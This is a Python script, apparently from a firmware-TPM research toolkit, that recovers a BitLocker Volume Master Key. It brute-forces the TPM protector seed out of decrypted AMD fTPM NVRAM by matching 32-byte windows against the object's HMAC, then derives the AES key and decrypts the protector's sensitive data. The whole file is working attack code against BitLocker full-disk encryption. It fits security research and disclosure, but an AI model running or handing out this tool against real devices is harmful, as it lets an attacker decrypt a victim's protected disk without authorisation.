import sys, json
from amdnvtool import crypto

# Parse input files
if len(sys.argv) < 3:
    print("usage: python3 decrypt_vmk.py PLAIN_NVRAM BITLOCKER_TPM_OBJECT")
plain_nvram_path = sys.argv[1]
tpm_object_path = sys.argv[2]

# (1/2) Parse NVRAM for protector_seed_candidates()
with open(plain_nvram_path, 'rb') as f:
    file_bytes = f.read()
nvram = json.loads(file_bytes)

# (2/2) Parse Bitlocker TPM object extracted with `dislocker-metadata` and converted to pure bytes
with open(tpm_object_path, 'rb') as f:
    tpm_object = f.read()

# helper to parse tpm object
tpm_object_pos = 0
def get_tpm_bytes(length : int) -> bytes:
    global tpm_object, tpm_object_pos
    tpm_bytes = tpm_object[tpm_object_pos:tpm_object_pos+length]
    tpm_object_pos += length
    return tpm_bytes



priv_length = int.from_bytes(get_tpm_bytes(2), 'big')

priv_hmac_length = int.from_bytes(get_tpm_bytes(2), 'big')
priv_hmac = get_tpm_bytes(priv_hmac_length)
assert priv_hmac_length == 32

priv_iv_length_raw = get_tpm_bytes(2)
priv_iv_length = int.from_bytes(priv_iv_length_raw, 'big')
priv_iv = get_tpm_bytes(priv_iv_length)
priv_iv_lv = priv_iv_length_raw + priv_iv
assert priv_iv_length == 16


sensitive_data_length = priv_length - 4 - priv_hmac_length - priv_iv_length
sensitive_data = get_tpm_bytes(sensitive_data_length)

pub_portion_length = int.from_bytes(get_tpm_bytes(2), 'big')
pub_portion = get_tpm_bytes(pub_portion_length)

name = b'\x00\x0b' + crypto.sha256(pub_portion)
assert len(name) == 0x22

'''
(1/3) Our first goal is to find `protector_seed` used to derive HMAC and AES keys of the 
TPM's private object. It's used like this:

  seeded_hmac_key = KDFa(pNameAlg, protector_seed, "INTEGRITY", NULL, NULL, bits)
  # usual sp800-108 in ctr m
  HMAC(key=protector_seed, 00000001 "INTEGRITY" 00 [context = ""] 00000100)

It's somewhere in the decrypted NVRAM (argv[1]). Thus, if we are able to
reconstruct the known HMAC key, we can reconstruct the known HMAC (from TPM
object in Bitlocker metadata protector.)
'''

def protector_seed_candidates_raw():
    for context in nvram:
        for element in context['sequence']:
            if element is None:
                continue
            for entry in element:
                entry = bytes.fromhex(entry)
                for i in range(0, len(entry) - 32):
                    yield entry[i:i+32]
                    yield entry[i:i+32][::-1]

def protector_seed_candidates():
    seen_candidates = set()
    for candidate in protector_seed_candidates_raw():
        if candidate in seen_candidates:
            continue
        seen_candidates.add(candidate)
        yield candidate

hmac_key = None

for protector_seed in protector_seed_candidates():

    # With this protector_seed, can we derive an HMAC key that reconstructs the known HMAC?
    msg = int(1).to_bytes(4, 'big') + b'INTEGRITY\0' + int(256).to_bytes(4, 'big')

    #print(f'{protector_seed.hex()=}')
    #print(f'{msg.hex()=}')
    hmac_key = crypto.hmac_sha256(protector_seed, msg)

    msg = priv_iv_length_raw + priv_iv + sensitive_data + name

    calc_hmac = crypto.hmac_sha256(hmac_key, msg)

    if calc_hmac == priv_hmac:
        # Yes, that must be the correct protector_seed!
        print(f'protector_seed = {protector_seed.hex()}')
        print(f'hmac_key = {hmac_key.hex()}')
        break

    hmac_key = None

if hmac_key is None:
    raise Exception("Could not find a protector seed!")


'''
(2/3) Now that we know the `protector_seed`, we can derive the aes_key. This will allow us to decrypt the TPM 
protector's sensitive data.
'''

key_bits = 128
msg = int(1).to_bytes(4, 'big') + b'STORAGE\0' + name + int(key_bits).to_bytes(4, 'big')
aes_key = crypto.hmac_sha256(protector_seed, msg)[:(key_bits//8)]
print(f'aes_key = {aes_key.hex()}')


'''
(3/3) Finally, extract the VMK from the sensitive data and print it.
'''

from Crypto.Cipher import AES

extension_len = (16 - len(sensitive_data) % 16) % 16
sensitive_data_ext = sensitive_data + b'\0' * extension_len

sensitive_data_dec = AES.new(aes_key, AES.MODE_CFB, priv_iv, segment_size=128).decrypt(sensitive_data_ext)[:-extension_len]
vmk = sensitive_data_dec[-32:]
print(f"decrypted sensitive_data = {sensitive_data_dec.hex()}")
print(f"decrypted vmk = {vmk.hex()}")
